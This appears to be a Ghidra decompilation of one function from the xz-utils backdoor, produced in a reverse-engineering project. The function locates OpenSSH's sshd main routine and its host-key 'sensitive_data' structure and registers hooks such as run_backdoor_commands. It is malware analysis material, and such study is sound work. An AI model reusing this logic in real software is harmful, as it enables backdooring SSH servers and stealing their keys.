// /home/kali/xzre-ghidra/xzregh/105410_sshd_find_sensitive_data.c
// Function: sshd_find_sensitive_data @ 0x105410
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_sensitive_data(elf_info_t * sshd, elf_info_t * libcrypto, string_references_t * refs, imported_funcs_t * funcs, global_context_t * ctx)


BOOL sshd_find_sensitive_data
               (elf_info_t *sshd,elf_info_t *libcrypto,string_references_t *refs,
               imported_funcs_t *funcs,global_context_t *ctx)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  u64 uVar3;
  u64 uVar4;
  u8 *code_start;
  u8 *puVar5;
  BOOL BVar6;
  BOOL BVar7;
  uint uVar8;
  uint uVar9;
  lzma_allocator *allocator;
  _func_42 *p_Var10;
  void *pvVar11;
  Elf64_Sym *pEVar12;
  Elf64_Sym *pEVar13;
  u8 *data_start;
  _func_46 *p_Var14;
  _func_51 *p_Var15;
  long lVar16;
  secret_data_item_t *psVar17;
  sensitive_data *psVar18;
  byte bVar19;
  u64 local_b8;
  u64 local_b0;
  u8 *local_a8;
  u8 *local_a0;
  sensitive_data *local_98;
  sensitive_data *local_90;
  secret_data_item_t local_88;
  code *local_70;
  undefined8 local_68;
  undefined8 local_60;
  code *local_58;
  undefined8 local_50;
  undefined8 local_48;
  code *local_40;
  undefined8 local_38;
  undefined8 local_30;
  
  bVar19 = 0;
  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
  if (BVar6 == 0) {
    return 0;
  }
  local_68 = 0x1b000001c8;
  local_88.code = (u8 *)sshd_proxy_elevate;
  local_88.shift_cursor = (secret_data_shift_cursor_t)0x1c8;
  local_88.operation_index = 0x1c;
  local_70 = run_backdoor_commands;
  local_88.shift_count = 0;
  local_88.index = 1;
  local_60 = 0x100000000;
  local_58 = sshd_get_usable_socket;
  local_50 = 0x1a000001c3;
  local_48 = 0x100000005;
  local_40 = sshd_get_client_socket;
  local_38 = 0x19000001bd;
  local_30 = 0x100000006;
  BVar6 = secret_data_append_items(&local_88,4,secret_data_append_item);
  if (BVar6 == 0) {
    return 0;
  }
  psVar17 = &local_88;
  for (lVar16 = 0x18; lVar16 != 0; lVar16 = lVar16 + -1) {
    *(undefined4 *)&psVar17->code = 0;
    psVar17 = (secret_data_item_t *)((long)psVar17 + (ulong)bVar19 * -8 + 4);
  }
  local_b8 = 0;
  local_b0 = 0;
  local_a8 = (u8 *)0x0;
  local_a0 = (u8 *)0x0;
  local_98 = (sensitive_data *)0x0;
  local_90 = (sensitive_data *)0x0;
  allocator = get_lzma_allocator();
  allocator->opaque = libcrypto;
  p_Var10 = (_func_42 *)lzma_alloc(0x118,allocator);
  funcs->EVP_DigestVerifyInit = p_Var10;
  if (p_Var10 != (_func_42 *)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  pvVar11 = elf_get_code_segment(sshd,&local_b8);
  uVar3 = local_b8;
  if (pvVar11 == (void *)0x0) {
    return 0;
  }
  pEVar12 = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
  pEVar13 = elf_symbol_get(libcrypto,STR_EVP_sm,0);
  if (pEVar13 == (Elf64_Sym *)0x0) {
    return 0;
  }
  data_start = (u8 *)elf_get_data_segment(sshd,&local_b0,0);
  uVar4 = local_b0;
  if (data_start == (u8 *)0x0) {
    return 0;
  }
  if (pEVar12 != (Elf64_Sym *)0x0) {
    EVar1 = pEVar12->st_value;
    pEVar2 = libcrypto->elfbase;
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
    funcs->EVP_DigestVerify = (_func_43 *)(pEVar2->e_ident + EVar1);
  }
  p_Var14 = (_func_46 *)lzma_alloc(0x838,allocator);
  funcs->EVP_CIPHER_CTX_new = p_Var14;
  if (p_Var14 != (_func_46 *)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  BVar6 = sshd_find_main(&local_a8,sshd,libcrypto,funcs);
  code_start = local_a8;
  if (BVar6 == 0) {
    return 0;
  }
  ctx->sshd_main = local_a8;
  BVar6 = is_endbr64_instruction(local_a8,local_a8 + 4,0xe230);
  ctx->uses_endbr64 = (uint)(BVar6 != 0);
  puVar5 = (u8 *)((long)pvVar11 + uVar3);
  if ((BVar6 != 0) &&
     (BVar6 = find_function(code_start,(void **)0x0,&local_a0,code_start,
                            (u8 *)((long)pvVar11 + uVar3),FIND_NOP), puVar5 = local_a0, BVar6 == 0))
  {
    return 0;
  }
  local_a0 = puVar5;
  BVar6 = sshd_get_sensitive_data_address_via_xcalloc
                    (data_start,data_start + uVar4,code_start,local_a0,refs,&local_90);
  BVar7 = sshd_get_sensitive_data_address_via_krb5ccname
                    (data_start,data_start + uVar4,code_start,local_a0,&local_98,sshd);
  p_Var15 = (_func_51 *)lzma_alloc(0xc28,allocator);
  psVar18 = local_90;
  funcs->EVP_chacha20 = p_Var15;
  if (p_Var15 != (_func_51 *)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  if (BVar6 == 0) {
LAB_00105772:
    if (BVar7 == 0) goto LAB_001057d3;
    uVar8 = 0;
LAB_001057a6:
    uVar9 = sshd_get_sensitive_data_score(local_98,sshd,refs);
  }
  else {
    if (BVar7 != 0) {
      if (local_90 == local_98) {
        uVar8 = sshd_get_sensitive_data_score(local_90,sshd,refs);
        if (uVar8 < 8) {
          return 0;
        }
        goto LAB_0010575e;
      }
      uVar8 = sshd_get_sensitive_data_score(local_90,sshd,refs);
      goto LAB_001057a6;
    }
    if (BVar6 == 0) goto LAB_00105772;
    uVar8 = sshd_get_sensitive_data_score(local_90,sshd,refs);
    uVar9 = 0;
  }
  if (((uVar9 <= uVar8) && (psVar18 = local_90, 7 < uVar8)) ||
     ((uVar8 <= uVar9 && (psVar18 = local_98, 7 < uVar9)))) {
LAB_0010575e:
    ctx->sshd_sensitive_data = psVar18;
    return 1;
  }
LAB_001057d3:
  lzma_free(funcs->EVP_DigestVerifyInit,allocator);
  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator);
  lzma_free(funcs->EVP_chacha20,allocator);
  return 0;
}

